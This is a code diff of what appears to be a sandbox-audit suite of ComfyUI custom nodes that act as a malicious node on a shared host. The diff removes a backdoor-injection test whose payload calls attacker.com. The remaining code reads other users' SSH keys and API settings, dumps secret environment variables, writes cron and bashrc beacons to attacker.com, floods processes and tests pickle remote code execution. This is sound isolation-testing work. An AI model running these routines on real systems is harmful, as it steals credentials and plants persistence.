@@ -8,9 +8,12 @@ Attack scenarios:
 1. Steal other users' generated images and project files
 2. Exfiltrate API keys from other users' settings
 3. Read SSH private keys for lateral movement
-4. Inject backdoor into other users' custom nodes
-5. Establish persistence via cron/bashrc
-6. Spawn background processes (crypto mining simulation)
+4. Establish persistence via cron/bashrc
+5. Spawn background processes (crypto mining simulation)
+6. Exfiltrate environment variables
+7. Network connectivity (C2 / exfiltration)
+8. Resource exhaustion (fork bomb simulation)
+9. Pickle RCE via __reduce__ (sandbox escape)
 """
 
 from __future__ import annotations
@@ -29,7 +32,7 @@ class ComfyCloudAttack(io.ComfyNode):
     def define_schema(cls) -> io.Schema:
         return io.Schema(
             node_id="AdversarialSummary",
-            display_name="🔴 ComfyCloud Attack Demo",
+            display_name="ComfyCloud Attack Demo",
             category="security_audit",
             inputs=[],
             outputs=[io.String.Output("report", display_name="Attack Report")],
@@ -49,9 +52,9 @@ class ComfyCloudAttack(io.ComfyNode):
         failures = []
 
         # ===== ATTACK 1: Steal other users' project files =====
-        lines.append("━" * 70)
+        lines.append("-" * 70)
         lines.append("ATTACK 1: STEAL OTHER USERS' PROJECT FILES")
-        lines.append("━" * 70)
+        lines.append("-" * 70)
         
         stolen_files = []
         for user in ["comfytestuser1", "comfytestuser2"]:
@@ -61,10 +64,10 @@ class ComfyCloudAttack(io.ComfyNode):
                     try:
                         content = f.read_text()[:200]
                         stolen_files.append((user, f.name, content))
-                        lines.append(f"  ✅ STOLEN from {user}: {f.name}")
+                        lines.append(f"  [PASS] STOLEN from {user}: {f.name}")
                         lines.append(f"     Content: {content}")
                     except Exception as e:
-                        lines.append(f"  ❌ BLOCKED {user}/{f.name}: {e}")
+                        lines.append(f"  [FAIL] BLOCKED {user}/{f.name}: {e}")
         
         if stolen_files:
             successes.append(f"Stole {len(stolen_files)} files from other users")
@@ -73,9 +76,9 @@ class ComfyCloudAttack(io.ComfyNode):
         lines.append("")
 
         # ===== ATTACK 2: Exfiltrate API Keys =====
-        lines.append("━" * 70)
+        lines.append("-" * 70)
         lines.append("ATTACK 2: EXFILTRATE API KEYS FROM OTHER USERS")
-        lines.append("━" * 70)
+        lines.append("-" * 70)
         
         stolen_keys = []
         for user in ["comfytestuser1", "comfytestuser2"]:
@@ -84,10 +87,10 @@ class ComfyCloudAttack(io.ComfyNode):
                 try:
                     content = settings_file.read_text()
                     stolen_keys.append((user, content))
-                    lines.append(f"  ✅ STOLEN {user}'s API settings:")
+                    lines.append(f"  [PASS] STOLEN {user}'s API settings:")
                     lines.append(f"     {content}")
                 except Exception as e:
-                    lines.append(f"  ❌ BLOCKED {user} settings: {e}")
+                    lines.append(f"  [FAIL] BLOCKED {user} settings: {e}")
         
         if stolen_keys:
             successes.append(f"Stole API keys from {len(stolen_keys)} users")
@@ -96,9 +99,9 @@ class ComfyCloudAttack(io.ComfyNode):
         lines.append("")
 
         # ===== ATTACK 3: Read SSH Private Keys =====
-        lines.append("━" * 70)
+        lines.append("-" * 70)
         lines.append("ATTACK 3: STEAL SSH PRIVATE KEYS FOR LATERAL MOVEMENT")
-        lines.append("━" * 70)
+        lines.append("-" * 70)
         
         stolen_ssh = []
         for user in ["comfytestuser1", "comfytestuser2"]:
@@ -107,10 +110,10 @@ class ComfyCloudAttack(io.ComfyNode):
                 try:
                     content = ssh_key.read_text()
                     stolen_ssh.append((user, content))
-                    lines.append(f"  ✅ STOLEN {user}'s SSH private key:")
+                    lines.append(f"  [PASS] STOLEN {user}'s SSH private key:")
                     lines.append(f"     {content[:100]}...")
                 except Exception as e:
-                    lines.append(f"  ❌ BLOCKED {user} SSH key: {e}")
+                    lines.append(f"  [FAIL] BLOCKED {user} SSH key: {e}")
         
         if stolen_ssh:
             successes.append(f"Stole SSH keys from {len(stolen_ssh)} users")
@@ -118,35 +121,10 @@ class ComfyCloudAttack(io.ComfyNode):
             failures.append("Could not access other users' SSH keys")
         lines.append("")
 
-        # ===== ATTACK 4: Inject Backdoor into Other Users' Nodes =====
-        lines.append("━" * 70)
-        lines.append("ATTACK 4: INJECT BACKDOOR INTO OTHER USERS' CUSTOM NODES")
-        lines.append("━" * 70)
-        
-        backdoor_code = "# BACKDOOR INJECTED BY MALICIOUS NODE\nimport os; os.system('curl attacker.com/pwned')\n"
-        backdoor_success = False
-        
-        for user in ["comfytestuser1", "comfytestuser2"]:
-            target = Path(f"/home/{user}/ComfyUI/custom_nodes/backdoor_test.py")
-            try:
-                target.parent.mkdir(parents=True, exist_ok=True)
-                target.write_text(backdoor_code)
-                lines.append(f"  ✅ INJECTED backdoor into {user}'s custom_nodes!")
-                lines.append(f"     Path: {target}")
-                backdoor_success = True
-            except Exception as e:
-                lines.append(f"  ❌ BLOCKED backdoor injection to {user}: {e}")
-        
-        if backdoor_success:
-            successes.append("Injected backdoor into other users' custom_nodes")
-        else:
-            failures.append("Could not inject backdoor into other users' directories")
-        lines.append("")
-
-        # ===== ATTACK 5: Establish Persistence =====
-        lines.append("━" * 70)
-        lines.append("ATTACK 5: ESTABLISH PERSISTENCE VIA CRON/BASHRC")
-        lines.append("━" * 70)
+        # ===== ATTACK 4: Establish Persistence =====
+        lines.append("-" * 70)
+        lines.append("ATTACK 4: ESTABLISH PERSISTENCE VIA CRON/BASHRC")
+        lines.append("-" * 70)
         
         persistence_payload = "\n# MALICIOUS PERSISTENCE\ncurl -s attacker.com/beacon &\n"
         persistence_success = False
@@ -155,20 +133,20 @@ class ComfyCloudAttack(io.ComfyNode):
         bashrc = Path.home() / ".bashrc_attack_test"
         try:
             bashrc.write_text(persistence_payload)
-            lines.append(f"  ✅ WROTE persistence payload to {bashrc}")
+            lines.append(f"  [PASS] WROTE persistence payload to {bashrc}")
             persistence_success = True
             bashrc.unlink()  # Clean up
         except Exception as e:
-            lines.append(f"  ❌ BLOCKED persistence write: {e}")
+            lines.append(f"  [FAIL] BLOCKED persistence write: {e}")
         
         # Try cron
         cron_target = Path("/tmp/malicious_cron")
         try:
             cron_target.write_text("* * * * * curl attacker.com/cron_beacon\n")
-            lines.append(f"  ✅ WROTE cron payload to {cron_target}")
+            lines.append(f"  [PASS] WROTE cron payload to {cron_target}")
             persistence_success = True
         except Exception as e:
-            lines.append(f"  ❌ BLOCKED cron write: {e}")
+            lines.append(f"  [FAIL] BLOCKED cron write: {e}")
         
         if persistence_success:
             successes.append("Established persistence mechanisms")
@@ -176,10 +154,10 @@ class ComfyCloudAttack(io.ComfyNode):
             failures.append("Could not establish persistence")
         lines.append("")
 
-        # ===== ATTACK 6: Spawn Background Process (Crypto Miner Simulation) =====
-        lines.append("━" * 70)
-        lines.append("ATTACK 6: SPAWN BACKGROUND PROCESS (CRYPTO MINER SIMULATION)")
-        lines.append("━" * 70)
+        # ===== ATTACK 5: Spawn Background Process (Crypto Miner Simulation) =====
+        lines.append("-" * 70)
+        lines.append("ATTACK 5: SPAWN BACKGROUND PROCESS (CRYPTO MINER SIMULATION)")
+        lines.append("-" * 70)
         
         try:
             # Spawn a harmless background process that just sleeps
@@ -189,18 +167,18 @@ class ComfyCloudAttack(io.ComfyNode):
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL,
             )
-            lines.append(f"  ✅ SPAWNED background process PID: {proc.pid}")
+            lines.append(f"  [PASS] SPAWNED background process PID: {proc.pid}")
             lines.append(f"     In production: This would be a crypto miner")
             successes.append(f"Spawned background process (PID {proc.pid})")
         except Exception as e:
-            lines.append(f"  ❌ BLOCKED process spawn: {e}")
+            lines.append(f"  [FAIL] BLOCKED process spawn: {e}")
             failures.append("Could not spawn background process")
         lines.append("")
 
-        # ===== ATTACK 7: Read Host Environment Variables =====
-        lines.append("━" * 70)
-        lines.append("ATTACK 7: EXFILTRATE ENVIRONMENT VARIABLES")
-        lines.append("━" * 70)
+        # ===== ATTACK 6: Read Host Environment Variables =====
+        lines.append("-" * 70)
+        lines.append("ATTACK 6: EXFILTRATE ENVIRONMENT VARIABLES")
+        lines.append("-" * 70)
         
         sensitive_vars = ["OPENAI_API_KEY", "ANTHROPIC_API_KEY", "HF_TOKEN", 
                          "AWS_ACCESS_KEY_ID", "GITHUB_TOKEN", "HOME", "USER"]
@@ -211,19 +189,19 @@ class ComfyCloudAttack(io.ComfyNode):
                 found_vars[var] = val[:30] + "..." if len(val) > 30 else val
         
         if found_vars:
-            lines.append("  ✅ EXFILTRATED environment variables:")
+            lines.append("  [PASS] EXFILTRATED environment variables:")
             for k, v in found_vars.items():
                 lines.append(f"     {k} = {v}")
             successes.append(f"Exfiltrated {len(found_vars)} environment variables")
         else:
-            lines.append("  ❌ No sensitive environment variables found")
+            lines.append("  [FAIL] No sensitive environment variables found")
             failures.append("Could not access environment variables")
         lines.append("")
 
-        # ===== ATTACK 8: Network Connectivity (C2 / Exfiltration) =====
-        lines.append("━" * 70)
-        lines.append("ATTACK 8: NETWORK CONNECTIVITY (C2 / EXFILTRATION)")
-        lines.append("━" * 70)
+        # ===== ATTACK 7: Network Connectivity (C2 / Exfiltration) =====
+        lines.append("-" * 70)
+        lines.append("ATTACK 7: NETWORK CONNECTIVITY (C2 / EXFILTRATION)")
+        lines.append("-" * 70)
         
         import socket
         try:
@@ -235,21 +213,21 @@ class ComfyCloudAttack(io.ComfyNode):
             s.close()
             
             if result == 0:
-                lines.append("  ✅ CONNECTED to 8.8.8.8:53 (Outbound Internet Access)")
+                lines.append("  [PASS] CONNECTED to 8.8.8.8:53 (Outbound Internet Access)")
                 lines.append("     Risk: Can download malware, exfiltrate data, reverse shell")
                 successes.append("Established outbound network connection")
             else:
-                lines.append(f"  ❌ CONNECTION FAILED (Errno: {result})")
+                lines.append(f"  [FAIL] CONNECTION FAILED (Errno: {result})")
                 failures.append("Blocked outbound network connection")
         except Exception as e:
-            lines.append(f"  ❌ NETWORK BLOCKED: {e}")
+            lines.append(f"  [FAIL] NETWORK BLOCKED: {e}")
             failures.append("Blocked outbound network connection")
         lines.append("")
 
-        # ===== ATTACK 9: Resource Exhaustion (Fork Bomb Simulation) =====
-        lines.append("━" * 70)
-        lines.append("ATTACK 9: RESOURCE EXHAUSTION (FORK BOMB SIMULATION)")
-        lines.append("━" * 70)
+        # ===== ATTACK 8: Resource Exhaustion (Fork Bomb Simulation) =====
+        lines.append("-" * 70)
+        lines.append("ATTACK 8: RESOURCE EXHAUSTION (FORK BOMB SIMULATION)")
+        lines.append("-" * 70)
         
         procs = []
         try:
@@ -259,7 +237,7 @@ class ComfyCloudAttack(io.ComfyNode):
                 p = subprocess.Popen(["sleep", "1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                 procs.append(p)
             
-            lines.append(f"  ✅ SUCCESSFULLY SPAWNED {len(procs)} processes")
+            lines.append(f"  [PASS] SUCCESSFULLY SPAWNED {len(procs)} processes")
             lines.append("     Risk: DoS, System freeze, OOM Killer invocation")
             successes.append(f"Resource exhaustion: Spawned {len(procs)} processes")
             
@@ -268,20 +246,20 @@ class ComfyCloudAttack(io.ComfyNode):
                 p.terminate()
                 
         except OSError as e:
-            lines.append(f"  ❌ FORK BLOCKED after {len(procs)} processes: {e}")
+            lines.append(f"  [FAIL] FORK BLOCKED after {len(procs)} processes: {e}")
             failures.append("Blocked resource exhaustion (Process limit reached)")
             # Cleanup
             for p in procs:
                 p.terminate()
         except Exception as e:
-            lines.append(f"  ❌ FAILED with error: {e}")
+            lines.append(f"  [FAIL] FAILED with error: {e}")
             failures.append("Resource exhaustion test failed")
         lines.append("")
 
-        # ===== ATTACK 10: PICKLE RCE VIA __reduce__ =====
-        lines.append("━" * 70)
-        lines.append("ATTACK 10: PICKLE RCE VIA __reduce__ (SANDBOX ESCAPE)")
-        lines.append("━" * 70)
+        # ===== ATTACK 9: PICKLE RCE VIA __reduce__ =====
+        lines.append("-" * 70)
+        lines.append("ATTACK 9: PICKLE RCE VIA __reduce__ (SANDBOX ESCAPE)")
+        lines.append("-" * 70)
         
         # This attack is tested via PickleRCENode which returns a malicious object.
         # The actual test happens at the RPC layer, not here.
@@ -290,12 +268,12 @@ class ComfyCloudAttack(io.ComfyNode):
         is_isolated = os.environ.get("PYISOLATE_CHILD") == "1"
         
         if not is_isolated:
-            lines.append("  ⚠️  NON-ISOLATED MODE: No RPC layer to test")
+            lines.append("  [WARN] NON-ISOLATED MODE: No RPC layer to test")
             lines.append("     Attack 10 is N/A - code runs in-process, no serialization")
             lines.append("     See PickleRCENode for isolated mode testing")
             # Not counted as success or failure - just N/A for this mode
         else:
-            lines.append("  ℹ️  ISOLATED MODE: Attack 10 tested via PickleRCENode")
+            lines.append("  [INFO] ISOLATED MODE: Attack 10 tested via PickleRCENode")
             lines.append("     If you see this, the RPC layer allowed this node to execute.")
             lines.append("     Run PickleRCENode separately to test __reduce__ exploit.")
             failures.append("Pickle RCE test: Run PickleRCENode for actual test")
@@ -307,22 +285,22 @@ class ComfyCloudAttack(io.ComfyNode):
         
         if successes:
             lines.append("")
-            lines.append("✅ SUCCESSFUL ATTACKS:")
+            lines.append("[PASS] SUCCESSFUL ATTACKS:")
             for s in successes:
                 lines.append(f"   • {s}")
         
         if failures:
             lines.append("")
-            lines.append("❌ BLOCKED ATTACKS:")
+            lines.append("[FAIL] BLOCKED ATTACKS:")
             for f in failures:
                 lines.append(f"   • {f}")
         
         lines.append("")
         if len(successes) > len(failures):
-            lines.append("⚠️  VERDICT: SYSTEM VULNERABLE - Majority of attacks succeeded")
+            lines.append("[WARN] VERDICT: SYSTEM VULNERABLE - Majority of attacks succeeded")
             lines.append("    A malicious custom node can steal data, inject code, and persist")
         else:
-            lines.append("✅ VERDICT: SYSTEM PROTECTED - Majority of attacks blocked")
+            lines.append("[PASS] VERDICT: SYSTEM PROTECTED - Majority of attacks blocked")
             lines.append("    Sandbox is effectively containing malicious behavior")
         
         lines.append("=" * 70)
@@ -343,7 +321,7 @@ class AdversarialFilesystemRead(io.ComfyNode):
     def define_schema(cls) -> io.Schema:
         return io.Schema(
             node_id="AdversarialFilesystemRead",
-            display_name="🔴 Read Sensitive File",
+            display_name="Read Sensitive File",
             category="security_audit",
             inputs=[
                 io.String.Input("path", default="/home/comfytestuser1/.comfy/user_settings.json"),
@@ -355,9 +333,9 @@ class AdversarialFilesystemRead(io.ComfyNode):
     def execute(cls, path: str) -> io.NodeOutput:
         try:
             content = Path(path).read_text()
-            result = f"✅ READ SUCCESS: {path}\n\n{content}"
+            result = f"[PASS] READ SUCCESS: {path}\n\n{content}"
         except Exception as e:
-            result = f"❌ READ BLOCKED: {path}\n\nError: {e}"
+            result = f"[FAIL] READ BLOCKED: {path}\n\nError: {e}"
         print(result)
         return io.NodeOutput(result)
 
@@ -369,7 +347,7 @@ class AdversarialFilesystemWrite(io.ComfyNode):
     def define_schema(cls) -> io.Schema:
         return io.Schema(
             node_id="AdversarialFilesystemWrite",
-            display_name="🔴 Write Arbitrary File",
+            display_name="Write Arbitrary File",
             category="security_audit",
             inputs=[
                 io.String.Input("path", default="/home/comfytestuser1/ComfyUI/custom_nodes/pwned.py"),
@@ -382,9 +360,9 @@ class AdversarialFilesystemWrite(io.ComfyNode):
     def execute(cls, path: str, content: str) -> io.NodeOutput:
         try:
             Path(path).write_text(content)
-            result = f"✅ WRITE SUCCESS: {path}\n\nWrote {len(content)} bytes"
+            result = f"[PASS] WRITE SUCCESS: {path}\n\nWrote {len(content)} bytes"
         except Exception as e:
-            result = f"❌ WRITE BLOCKED: {path}\n\nError: {e}"
+            result = f"[FAIL] WRITE BLOCKED: {path}\n\nError: {e}"
         print(result)
         return io.NodeOutput(result)
 
@@ -396,7 +374,7 @@ class AdversarialEnvLeak(io.ComfyNode):
     def define_schema(cls) -> io.Schema:
         return io.Schema(
             node_id="AdversarialEnvLeak",
-            display_name="🔴 Dump Environment",
+            display_name="Dump Environment",
             category="security_audit",
             inputs=[],
             outputs=[io.String.Output("env_dump", display_name="Environment Dump")],
@@ -432,7 +410,7 @@ class PickleRCEBomb:
 
 
 class PickleRCENode(io.ComfyNode):
-    """ATTACK 10: Return a malicious object with __reduce__ to test RPC layer.
+    """ATTACK 9: Return a malicious object with __reduce__ to test RPC layer.
     
     This is the REAL pickle RCE test. The node RETURNS an object with __reduce__.
     
@@ -444,19 +422,19 @@ class PickleRCENode(io.ComfyNode):
     - ISOLATED + PICKLE RPC: Object is pickled on child, unpickled on host.
                              __reduce__ executes os.system() on HOST.
                              /tmp/pyisolate_pwned is created.
-                             STATUS: ❌ VULNERABLE - RCE succeeded
+                             STATUS: [FAIL] VULNERABLE - RCE succeeded
     
     - ISOLATED + JSON-RPC: Object cannot be JSON serialized.
                            TypeError raised, node fails cleanly.
                            /tmp/pyisolate_pwned is NOT created.
-                           STATUS: ✅ PROTECTED - RCE blocked
+                           STATUS: [PASS] PROTECTED - RCE blocked
     """
     
     @classmethod
     def define_schema(cls) -> io.Schema:
         return io.Schema(
             node_id="PickleRCENode",
-            display_name="🔴 Attack 10: Pickle RCE Test",
+            display_name="Attack 10: Pickle RCE Test",
             category="security_audit",
             inputs=[],
             outputs=[io.String.Output("result", display_name="Attack Result")],
@@ -476,14 +454,14 @@ class PickleRCENode(io.ComfyNode):
         
         lines = []
         lines.append("=" * 60)
-        lines.append("ATTACK 10: PICKLE RCE VIA __reduce__")
+        lines.append("ATTACK 9: PICKLE RCE VIA __reduce__")
         lines.append("=" * 60)
         lines.append(f"Isolated mode: {is_isolated}")
         lines.append(f"PID: {os.getpid()}")
         lines.append("")
         
         if not is_isolated:
-            lines.append("⚠️  NON-ISOLATED MODE")
+            lines.append("[WARN] NON-ISOLATED MODE")
             lines.append("   No serialization occurs - attack is N/A")
             lines.append("   The bomb object is returned directly in-process")
             lines.append("   This mode has NO protection against malicious code")
@@ -493,7 +471,7 @@ class PickleRCENode(io.ComfyNode):
         
         # ISOLATED MODE: Create the bomb and return it
         # The RPC layer will attempt to serialize this
-        lines.append("ℹ️  ISOLATED MODE - Creating __reduce__ bomb...")
+        lines.append("[INFO] ISOLATED MODE - Creating __reduce__ bomb...")
         lines.append("   Returning malicious object to test RPC serialization")
         lines.append("")
         lines.append("   If you see this message, one of two things happened:")
@@ -528,7 +506,7 @@ class PickleRCEVerify(io.ComfyNode):
     def define_schema(cls) -> io.Schema:
         return io.Schema(
             node_id="PickleRCEVerify",
-            display_name="🔴 Attack 10: Verify RCE",
+            display_name="Attack 10: Verify RCE",
             category="security_audit",
             inputs=[],
             outputs=[io.String.Output("result", display_name="Verification Result")],
@@ -540,13 +518,13 @@ class PickleRCEVerify(io.ComfyNode):
         
         lines = []
         lines.append("=" * 60)
-        lines.append("ATTACK 10 VERIFICATION")
+        lines.append("ATTACK 9 VERIFICATION")
         lines.append("=" * 60)
         
         if os.path.exists(marker_path):
             try:
                 content = open(marker_path).read()
-                lines.append("❌ CRITICAL: RCE ATTACK SUCCEEDED!")
+                lines.append("[FAIL] CRITICAL: RCE ATTACK SUCCEEDED!")
                 lines.append(f"   Marker file exists: {marker_path}")
                 lines.append(f"   Content: {content}")
                 lines.append("")
@@ -556,9 +534,9 @@ class PickleRCEVerify(io.ComfyNode):
                 # Clean up
                 os.unlink(marker_path)
             except Exception as e:
-                lines.append(f"❌ Marker exists but couldn't read: {e}")
+                lines.append(f"[FAIL] Marker exists but couldn't read: {e}")
         else:
-            lines.append("✅ PROTECTED: No RCE marker found")
+            lines.append("[PASS] PROTECTED: No RCE marker found")
             lines.append(f"   {marker_path} does not exist")
             lines.append("")
             lines.append("   Either:")
